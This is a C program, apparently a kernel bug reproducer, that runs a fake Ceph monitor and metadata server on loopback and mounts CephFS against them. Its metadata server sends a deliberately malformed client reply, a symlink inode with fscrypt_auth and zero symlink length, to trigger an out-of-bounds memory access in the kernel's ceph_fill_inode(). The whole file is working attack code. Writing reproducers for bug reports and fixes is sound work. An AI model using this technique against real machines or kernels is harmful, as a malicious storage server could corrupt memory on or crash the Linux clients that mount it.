// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <net/if.h>

#define CEPH_BANNER "ceph v027"
#define CEPH_BANNER_LEN 9

#define CEPH_ENTITY_TYPE_MON    0x01
#define CEPH_ENTITY_TYPE_MDS    0x02

#define CEPH_MSGR_TAG_READY          1
#define CEPH_MSGR_TAG_CLOSE          6
#define CEPH_MSGR_TAG_MSG            7
#define CEPH_MSGR_TAG_ACK            8
#define CEPH_MSGR_TAG_KEEPALIVE      9
#define CEPH_MSGR_TAG_SEQ           13
#define CEPH_MSGR_TAG_KEEPALIVE2    14
#define CEPH_MSGR_TAG_KEEPALIVE2_ACK 15

#define CEPH_MSG_MON_MAP                4
#define CEPH_MSG_MON_SUBSCRIBE         15
#define CEPH_MSG_MON_SUBSCRIBE_ACK     16
#define CEPH_MSG_AUTH                  17
#define CEPH_MSG_AUTH_REPLY            18
#define CEPH_MSG_MDS_MAP               21
#define CEPH_MSG_CLIENT_SESSION        22
#define CEPH_MSG_CLIENT_REQUEST        24
#define CEPH_MSG_CLIENT_REPLY          26
#define CEPH_MSG_OSD_MAP               41

#define CEPH_AUTH_NONE                0x1

#define CEPH_SESSION_OPEN               1

#define CEPH_MDS_OP_GETATTR      0x00101
#define CEPH_MDS_STATE_ACTIVE          13

#define CEPH_NOSNAP  ((uint64_t)-2)
#define CEPH_INLINE_NONE ((uint64_t)-1)

#define CEPH_ENTITY_ADDR_TYPE_LEGACY 1

#define CEPH_FEATURE_MSG_AUTH  (1ULL << 23)

#define CEPHFS_FEATURE_REPLY_ENCODING_BIT 9

#define CRUSH_MAGIC 0x00010000ul

#define CEPH_MSG_FOOTER_COMPLETE (1 << 0)

#define MON_PORT 6789
#define MDS_PORT 6800

static uint32_t crc32c_table[256];

static void crc32c_init(void)
{
	uint32_t i, j, crc;

	for (i = 0; i < 256; i++) {
		crc = i;
		for (j = 0; j < 8; j++)
			crc = (crc >> 1) ^ (0x82F63B78u & (-(int32_t)(crc & 1)));
		crc32c_table[i] = crc;
	}
}

static uint32_t crc32c(uint32_t crc, const void *buf, size_t len)
{
	const uint8_t *p = buf;

	while (len--)
		crc = crc32c_table[(crc ^ *p++) & 0xff] ^ (crc >> 8);
	return crc;
}

struct buf {
	uint8_t *p;
	size_t len;
	size_t cap;
};

static void binit(struct buf *b, uint8_t *mem, size_t cap)
{
	b->p = mem;
	b->len = 0;
	b->cap = cap;
}

static void bput(struct buf *b, const void *d, size_t n)
{
	if (b->len + n > b->cap) {
		fprintf(stderr, "[!] buffer overflow in encoder\n");
		exit(1);
	}
	memcpy(b->p + b->len, d, n);
	b->len += n;
}

static void b8(struct buf *b, uint8_t v)   { bput(b, &v, 1); }
static void b16(struct buf *b, uint16_t v) { bput(b, &v, 2); }
static void b32(struct buf *b, uint32_t v) { bput(b, &v, 4); }
static void b64(struct buf *b, uint64_t v) { bput(b, &v, 8); }

static void bzero_n(struct buf *b, size_t n)
{
	while (n--)
		b8(b, 0);
}

static void bstr(struct buf *b, const char *s)
{
	uint32_t n = (uint32_t)strlen(s);

	b32(b, n);
	bput(b, s, n);
}

static void btime(struct buf *b)
{
	b32(b, 0);
	b32(b, 0);
}

static volatile int g_payload_sent;

static const uint8_t g_fsid[16] = {
	0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
	0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00,
};

static void b_entity_addr(struct buf *b, uint16_t port)
{
	b8(b, 1);
	b8(b, 1);
	b8(b, 1);
	b32(b, 4 + 4 + 4 + 16);
	b32(b, CEPH_ENTITY_ADDR_TYPE_LEGACY);
	b32(b, 0);
	b32(b, 16);
	b16(b, AF_INET);
	b16(b, htons(port));
	b32(b, htonl(INADDR_LOOPBACK));
	bzero_n(b, 8);
}

static void b_entity_addrvec(struct buf *b, uint16_t port)
{
	b8(b, 2);
	b32(b, 1);
	b_entity_addr(b, port);
}

struct conn {
	int fd;
	uint64_t peer_features;
	uint64_t out_seq;
	uint8_t entity_type;
	uint64_t entity_num;
};

static int xread(int fd, void *buf, size_t n)
{
	uint8_t *p = buf;
	size_t got = 0;

	while (got < n) {
		ssize_t r = read(fd, p + got, n - got);

		if (r == 0)
			return -1;
		if (r < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		got += (size_t)r;
	}
	return 0;
}

static int xwrite(int fd, const void *buf, size_t n)
{
	const uint8_t *p = buf;
	size_t sent = 0;

	while (sent < n) {
		ssize_t r = write(fd, p + sent, n - sent);

		if (r <= 0) {
			if (r < 0 && errno == EINTR)
				continue;
			return -1;
		}
		sent += (size_t)r;
	}
	return 0;
}

static int xskip(int fd, size_t n)
{
	uint8_t tmp[1024];

	while (n) {
		size_t chunk = n > sizeof(tmp) ? sizeof(tmp) : n;

		if (xread(fd, tmp, chunk) < 0)
			return -1;
		n -= chunk;
	}
	return 0;
}

struct msg_connect {
	uint64_t features;
	uint32_t host_type;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_protocol;
	uint32_t authorizer_len;
	uint8_t flags;
} __attribute__((packed));

struct msg_connect_reply {
	uint8_t tag;
	uint64_t features;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_len;
	uint8_t flags;
} __attribute__((packed));

struct msg_header {
	uint64_t seq;
	uint64_t tid;
	uint16_t type;
	uint16_t priority;
	uint16_t version;
	uint32_t front_len;
	uint32_t middle_len;
	uint32_t data_len;
	uint16_t data_off;
	uint8_t src_type;
	uint64_t src_num;
	uint16_t compat_version;
	uint16_t reserved;
	uint32_t crc;
} __attribute__((packed));

struct msg_footer {
	uint32_t front_crc;
	uint32_t middle_crc;
	uint32_t data_crc;
	uint64_t sig;
	uint8_t flags;
} __attribute__((packed));

struct msg_footer_old {
	uint32_t front_crc;
	uint32_t middle_crc;
	uint32_t data_crc;
	uint8_t flags;
} __attribute__((packed));

static int do_handshake(struct conn *c, const char *who)
{
	uint8_t banner[CEPH_BANNER_LEN];
	uint8_t client_addr[136];
	uint8_t out[CEPH_BANNER_LEN + 136 + 136];
	uint8_t peer_for_me[136];
	struct msg_connect mc;
	struct msg_connect_reply mcr;
	struct sockaddr_in peer;
	socklen_t plen = sizeof(peer);
	size_t off = 0;

	if (xread(c->fd, banner, CEPH_BANNER_LEN) < 0)
		return -1;
	if (memcmp(banner, CEPH_BANNER, CEPH_BANNER_LEN) != 0) {
		fprintf(stderr, "[!] %s: bad client banner\n", who);
		return -1;
	}
	if (xread(c->fd, client_addr, sizeof(client_addr)) < 0)
		return -1;

	memcpy(out + off, CEPH_BANNER, CEPH_BANNER_LEN);
	off += CEPH_BANNER_LEN;
	memset(out + off, 0, 136);
	off += 136;

	memset(peer_for_me, 0, sizeof(peer_for_me));
	if (getpeername(c->fd, (struct sockaddr *)&peer, &plen) == 0) {

		uint16_t fam_be = htons(AF_INET);

		memcpy(peer_for_me + 8, &fam_be, 2);
		memcpy(peer_for_me + 10, &peer.sin_port, 2);
		memcpy(peer_for_me + 12, &peer.sin_addr, 4);
	}
	memcpy(out + off, peer_for_me, 136);
	off += 136;

	if (xwrite(c->fd, out, off) < 0)
		return -1;

	if (xread(c->fd, &mc, sizeof(mc)) < 0)
		return -1;
	if (mc.authorizer_len && xskip(c->fd, mc.authorizer_len) < 0)
		return -1;

	c->peer_features = mc.features;

	memset(&mcr, 0, sizeof(mcr));
	mcr.tag = CEPH_MSGR_TAG_READY;
	mcr.features = mc.features;
	mcr.global_seq = mc.global_seq ? mc.global_seq : 1;
	mcr.connect_seq = mc.connect_seq + 1;
	mcr.protocol_version = mc.protocol_version;
	mcr.authorizer_len = 0;
	mcr.flags = 0;

	if (xwrite(c->fd, &mcr, sizeof(mcr)) < 0)
		return -1;

	fprintf(stderr, "[+] %s: msgr v1 session established (features %llx)\n",
		who, (unsigned long long)c->peer_features);
	return 0;
}

static size_t footer_size(struct conn *c)
{
	return (c->peer_features & CEPH_FEATURE_MSG_AUTH) ?
		sizeof(struct msg_footer) : sizeof(struct msg_footer_old);
}

static int send_msg(struct conn *c, uint16_t type, uint16_t version,
		    uint64_t tid, const void *front, uint32_t front_len)
{
	struct msg_header hdr;
	uint8_t tag = CEPH_MSGR_TAG_MSG;
	union {
		struct msg_footer f;
		struct msg_footer_old fo;
	} ftr;
	size_t fsz = footer_size(c);

	memset(&hdr, 0, sizeof(hdr));
	hdr.seq = ++c->out_seq;
	hdr.tid = tid;
	hdr.type = type;
	hdr.priority = 127;
	hdr.version = version;
	hdr.front_len = front_len;
	hdr.middle_len = 0;
	hdr.data_len = 0;
	hdr.data_off = 0;
	hdr.src_type = c->entity_type;
	hdr.src_num = c->entity_num;
	hdr.compat_version = 0;
	hdr.reserved = 0;
	hdr.crc = crc32c(0, &hdr, offsetof(struct msg_header, crc));

	memset(&ftr, 0, sizeof(ftr));
	if (fsz == sizeof(struct msg_footer)) {
		ftr.f.front_crc = crc32c(0, front, front_len);
		ftr.f.middle_crc = 0;
		ftr.f.data_crc = 0;
		ftr.f.sig = 0;
		ftr.f.flags = CEPH_MSG_FOOTER_COMPLETE;
	} else {
		ftr.fo.front_crc = crc32c(0, front, front_len);
		ftr.fo.middle_crc = 0;
		ftr.fo.data_crc = 0;
		ftr.fo.flags = CEPH_MSG_FOOTER_COMPLETE;
	}

	if (xwrite(c->fd, &tag, 1) < 0)
		return -1;
	if (xwrite(c->fd, &hdr, sizeof(hdr)) < 0)
		return -1;
	if (front_len && xwrite(c->fd, front, front_len) < 0)
		return -1;
	if (xwrite(c->fd, &ftr, fsz) < 0)
		return -1;
	return 0;
}

static int recv_item(struct conn *c, struct msg_header *hdr,
		     uint8_t *front, size_t front_cap)
{
	uint8_t tag;
	uint8_t ts[8];

	if (xread(c->fd, &tag, 1) < 0)
		return -1;

	switch (tag) {
	case CEPH_MSGR_TAG_MSG:
		break;
	case CEPH_MSGR_TAG_ACK:
	case CEPH_MSGR_TAG_SEQ:
		if (xread(c->fd, ts, 8) < 0)
			return -1;
		return 0;
	case CEPH_MSGR_TAG_KEEPALIVE:
		return 0;
	case CEPH_MSGR_TAG_KEEPALIVE2: {
		uint8_t ack = CEPH_MSGR_TAG_KEEPALIVE2_ACK;

		if (xread(c->fd, ts, 8) < 0)
			return -1;
		if (xwrite(c->fd, &ack, 1) < 0)
			return -1;
		if (xwrite(c->fd, ts, 8) < 0)
			return -1;
		return 0;
	}
	case CEPH_MSGR_TAG_CLOSE:
		return -1;
	default:
		fprintf(stderr, "[!] unexpected tag %u\n", tag);
		return -1;
	}

	if (xread(c->fd, hdr, sizeof(*hdr)) < 0)
		return -1;

	if (hdr->front_len > front_cap) {
		fprintf(stderr, "[!] front too big: %u\n", hdr->front_len);
		return -1;
	}
	if (hdr->front_len && xread(c->fd, front, hdr->front_len) < 0)
		return -1;
	if (hdr->middle_len && xskip(c->fd, hdr->middle_len) < 0)
		return -1;
	if (hdr->data_len && xskip(c->fd, hdr->data_len) < 0)
		return -1;
	if (xskip(c->fd, footer_size(c)) < 0)
		return -1;

	return (int)hdr->type;
}

static uint32_t build_auth_reply(uint8_t *out, size_t cap)
{
	struct buf b;

	binit(&b, out, cap);
	b32(&b, CEPH_AUTH_NONE);
	b32(&b, 0);
	b64(&b, 4321);
	b32(&b, 0);
	b32(&b, 0);
	return (uint32_t)b.len;
}

static uint32_t build_subscribe_ack(uint8_t *out, size_t cap)
{
	struct buf b;

	binit(&b, out, cap);
	b32(&b, 300);
	bput(&b, g_fsid, 16);
	return (uint32_t)b.len;
}

static uint32_t build_monmap(uint8_t *out, size_t cap)
{
	struct buf b, m, o;
	uint8_t mem[1024], inner[512];
	size_t lenpos;

	binit(&m, inner, sizeof(inner));
	bstr(&m, "a");
	b_entity_addrvec(&m, MON_PORT);

	binit(&b, mem, sizeof(mem));
	b8(&b, 6);
	b8(&b, 1);
	lenpos = b.len;
	b32(&b, 0);
	bput(&b, g_fsid, 16);
	b32(&b, 1);
	btime(&b);
	btime(&b);

	b8(&b, 1); b8(&b, 1); b32(&b, 8); b64(&b, 0);

	b8(&b, 1); b8(&b, 1); b32(&b, 8); b64(&b, 0);
	b32(&b, 1);
	bstr(&b, "a");
	b8(&b, 1);
	b8(&b, 1);
	b32(&b, (uint32_t)m.len);
	bput(&b, inner, m.len);

	{
		uint32_t sl = (uint32_t)(b.len - lenpos - 4);

		memcpy(mem + lenpos, &sl, 4);
	}

	binit(&o, out, cap);
	b32(&o, (uint32_t)b.len);
	bput(&o, mem, b.len);
	return (uint32_t)o.len;
}

static uint32_t build_crush(uint8_t *out, size_t cap)
{
	struct buf b;

	binit(&b, out, cap);
	b32(&b, CRUSH_MAGIC);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	return (uint32_t)b.len;
}

static uint32_t build_osdmap(uint8_t *out, size_t cap)
{
	struct buf b, o;
	uint8_t mem[1024], crush[64];
	uint32_t clen;

	clen = build_crush(crush, sizeof(crush));

	binit(&b, mem, sizeof(mem));
	b8(&b, 8);
	b8(&b, 7);
	b32(&b, 0);
	b8(&b, 8);
	b8(&b, 1);
	b32(&b, 0);

	bput(&b, g_fsid, 16);
	b32(&b, 1);
	btime(&b);
	btime(&b);

	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);

	b32(&b, clen);
	bput(&b, crush, clen);

	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);

	bzero_n(&b, 16);

	binit(&o, out, cap);
	bput(&o, g_fsid, 16);
	b32(&o, 0);
	b32(&o, 1);
	b32(&o, 1);
	b32(&o, (uint32_t)b.len);
	bput(&o, mem, b.len);
	return (uint32_t)o.len;
}

static uint32_t build_mdsmap(uint8_t *out, size_t cap)
{
	struct buf b, info, o;
	uint8_t mem[1024], imem[512];
	size_t lenpos;

	binit(&info, imem, sizeof(imem));
	b64(&info, 0);
	b32(&info, 0);
	b32(&info, 0);
	b32(&info, 1);
	b32(&info, CEPH_MDS_STATE_ACTIVE);
	b64(&info, 0);
	b_entity_addrvec(&info, MDS_PORT);
	btime(&info);
	b32(&info, 0);
	b32(&info, 0);
	b32(&info, 0);

	binit(&b, mem, sizeof(mem));
	b8(&b, 4);
	b8(&b, 1);
	lenpos = b.len;
	b32(&b, 0);

	b32(&b, 2);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 60);
	b32(&b, 300);
	b64(&b, 1ULL << 40);
	b32(&b, 1);
	b32(&b, 1);

	b64(&b, 1);
	b8(&b, 8);
	b8(&b, 1);
	b32(&b, (uint32_t)info.len);
	bput(&b, imem, info.len);

	b32(&b, 0);
	b64(&b, 0);

	b16(&b, 8);

	b64(&b, 0); b32(&b, 0);
	b64(&b, 0); b32(&b, 0);
	b64(&b, 0); b32(&b, 0);
	b64(&b, 0);
	btime(&b);
	btime(&b);
	b32(&b, 0);
	b32(&b, 1); b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b32(&b, 0);
	b8(&b, 1);
	b8(&b, 1);
	b8(&b, 0);
	b8(&b, 1);
	bstr(&b, "cephfs");

	{
		uint32_t sl = (uint32_t)(b.len - lenpos - 4);

		memcpy(mem + lenpos, &sl, 4);
	}

	binit(&o, out, cap);
	bput(&o, g_fsid, 16);
	b32(&o, 2);
	b32(&o, (uint32_t)b.len);
	bput(&o, mem, b.len);
	return (uint32_t)o.len;
}

static uint32_t build_session_open(uint8_t *out, size_t cap)
{
	struct buf b;

	binit(&b, out, cap);

	b32(&b, CEPH_SESSION_OPEN);
	b64(&b, 0);
	btime(&b);
	b32(&b, 0);
	b32(&b, 0);

	b32(&b, 0);

	b32(&b, 8);
	b64(&b, 1ULL << CEPHFS_FEATURE_REPLY_ENCODING_BIT);
	return (uint32_t)b.len;
}

static uint32_t build_client_reply(uint8_t *out, size_t cap)
{
	struct buf b, in, tr;
	uint8_t inode_mem[1024], trace_mem[1024];

	binit(&in, inode_mem, sizeof(inode_mem));
	b64(&in, 1);
	b64(&in, CEPH_NOSNAP);
	b32(&in, 0);
	b64(&in, 1);
	b64(&in, 1);

	b32(&in, 0); b32(&in, 0);
	b64(&in, 0);
	b32(&in, 0); b32(&in, 0);
	b64(&in, 0);
	b8(&in, 0);

	b32(&in, 0); b32(&in, 0); b32(&in, 0); b32(&in, 0);
	b32(&in, 0); b32(&in, 0); b32(&in, 0);
	btime(&in);
	btime(&in);
	btime(&in);
	b32(&in, 0);
	b64(&in, 0);
	b64(&in, 0);
	b64(&in, 0);
	b32(&in, 0);
	b32(&in, 0120777);
	b32(&in, 0);
	b32(&in, 0);
	b32(&in, 1);
	b64(&in, 0); b64(&in, 0); b64(&in, 0); b64(&in, 0); b64(&in, 0);
	btime(&in);
	b32(&in, 0);

	b32(&in, 0);

	b8(&in, 0); b8(&in, 0); b16(&in, 0); b32(&in, 0);
	b32(&in, 0);

	b64(&in, CEPH_INLINE_NONE);
	b32(&in, 0);

	b8(&in, 1); b8(&in, 1); b32(&in, 16); b64(&in, 0); b64(&in, 0);
	b32(&in, 0);
	btime(&in);
	b64(&in, 0);
	b32(&in, 0xffffffffu);
	btime(&in);
	b64(&in, 0);
	b32(&in, 0);
	b8(&in, 0);

	b32(&in, 8);
	b64(&in, 0x0101010101010101ULL);
	b32(&in, 0);

	binit(&tr, trace_mem, sizeof(trace_mem));
	b8(&tr, 7);
	b8(&tr, 1);
	b32(&tr, (uint32_t)in.len);
	bput(&tr, inode_mem, in.len);

	binit(&b, out, cap);
	b32(&b, CEPH_MDS_OP_GETATTR);
	b32(&b, 0);
	b32(&b, 2);
	b8(&b, 1);
	b8(&b, 0);
	b8(&b, 1);

	b32(&b, (uint32_t)tr.len);
	bput(&b, trace_mem, tr.len);
	b32(&b, 0);
	b32(&b, 0);

	return (uint32_t)b.len;
}

static void *mon_thread(void *arg)
{
	int lfd = (int)(long)arg;

	for (;;) {
		struct conn c;
		struct msg_header hdr;
		static uint8_t front[65536];
		static uint8_t obuf[4096];
		uint32_t olen;
		int fd = accept(lfd, NULL, NULL);

		if (fd < 0)
			continue;

		memset(&c, 0, sizeof(c));
		c.fd = fd;
		c.entity_type = CEPH_ENTITY_TYPE_MON;
		c.entity_num = 0;

		if (do_handshake(&c, "mon") < 0) {
			close(fd);
			continue;
		}

		for (;;) {
			int type = recv_item(&c, &hdr, front, sizeof(front));

			if (type < 0)
				break;
			if (type == 0)
				continue;

			switch (type) {
			case CEPH_MSG_AUTH:
				olen = build_auth_reply(obuf, sizeof(obuf));
				send_msg(&c, CEPH_MSG_AUTH_REPLY, 1, hdr.tid,
					 obuf, olen);
				break;
			case CEPH_MSG_MON_SUBSCRIBE:
				fprintf(stderr, "[+] mon: subscribe -> sending maps\n");
				olen = build_subscribe_ack(obuf, sizeof(obuf));
				send_msg(&c, CEPH_MSG_MON_SUBSCRIBE_ACK, 1, 0,
					 obuf, olen);
				olen = build_monmap(obuf, sizeof(obuf));
				send_msg(&c, CEPH_MSG_MON_MAP, 1, 0, obuf, olen);
				olen = build_osdmap(obuf, sizeof(obuf));
				send_msg(&c, CEPH_MSG_OSD_MAP, 1, 0, obuf, olen);
				olen = build_mdsmap(obuf, sizeof(obuf));
				send_msg(&c, CEPH_MSG_MDS_MAP, 1, 0, obuf, olen);
				break;
			default:
				fprintf(stderr, "[ ] mon: ignoring msg type %d\n",
					type);
				break;
			}
		}
		close(fd);
	}
	return NULL;
}

static void *mds_thread(void *arg)
{
	int lfd = (int)(long)arg;

	for (;;) {
		struct conn c;
		struct msg_header hdr;
		static uint8_t front[65536];
		static uint8_t obuf[4096];
		uint32_t olen;
		int fd = accept(lfd, NULL, NULL);

		if (fd < 0)
			continue;

		memset(&c, 0, sizeof(c));
		c.fd = fd;
		c.entity_type = CEPH_ENTITY_TYPE_MDS;
		c.entity_num = 0;

		if (do_handshake(&c, "mds") < 0) {
			close(fd);
			continue;
		}

		for (;;) {
			int type = recv_item(&c, &hdr, front, sizeof(front));

			if (type < 0)
				break;
			if (type == 0)
				continue;

			switch (type) {
			case CEPH_MSG_CLIENT_SESSION:
				if (g_payload_sent)
					break;
				fprintf(stderr, "[+] mds: session request -> OPEN\n");
				olen = build_session_open(obuf, sizeof(obuf));
				send_msg(&c, CEPH_MSG_CLIENT_SESSION, 3, 0,
					 obuf, olen);
				break;
			case CEPH_MSG_CLIENT_REQUEST:
				if (g_payload_sent)
					break;
				fprintf(stderr,
					"[+] mds: client request tid %llu -> "
					"malicious reply (S_IFLNK, fscrypt_auth, "
					"symlink_len=0)\n",
					(unsigned long long)hdr.tid);
				olen = build_client_reply(obuf, sizeof(obuf));
				send_msg(&c, CEPH_MSG_CLIENT_REPLY, 1, hdr.tid,
					 obuf, olen);
				g_payload_sent = 1;
				break;
			default:
				fprintf(stderr, "[ ] mds: ignoring msg type %d\n",
					type);
				break;
			}
		}
		close(fd);
	}
	return NULL;
}

static int make_listener(uint16_t port)
{
	struct sockaddr_in sa;
	int fd, one = 1;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		return -1;
	}
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind");
		close(fd);
		return -1;
	}
	if (listen(fd, 8) < 0) {
		perror("listen");
		close(fd);
		return -1;
	}
	return fd;
}

static void bring_up_loopback(void)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		return;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) == 0) {
		ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
		ioctl(fd, SIOCSIFFLAGS, &ifr);
	}
	close(fd);
}

int main(void)
{
	pthread_t t1, t2;
	int mon_fd, mds_fd;
	int ret;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	crc32c_init();
	bring_up_loopback();

	mkdir("./cephmnt", 0755);

	mon_fd = make_listener(MON_PORT);
	mds_fd = make_listener(MDS_PORT);
	if (mon_fd < 0 || mds_fd < 0)
		return 1;

	pthread_create(&t1, NULL, mon_thread, (void *)(long)mon_fd);
	pthread_create(&t2, NULL, mds_thread, (void *)(long)mds_fd);

	usleep(200000);

	fprintf(stderr, "[*] mounting cephfs against the fake cluster...\n");
	ret = mount("127.0.0.1:6789:/", "./cephmnt", "ceph", 0,
		    "mount_timeout=10,noshare");
	fprintf(stderr, "[*] mount returned %d (%s), payload delivered: %d\n",
		ret, ret ? strerror(errno) : "ok", g_payload_sent);
	fprintf(stderr, "[*] check dmesg for the KASAN slab-out-of-bounds "
			"report in ceph_fill_inode()\n");
	return 0;
}
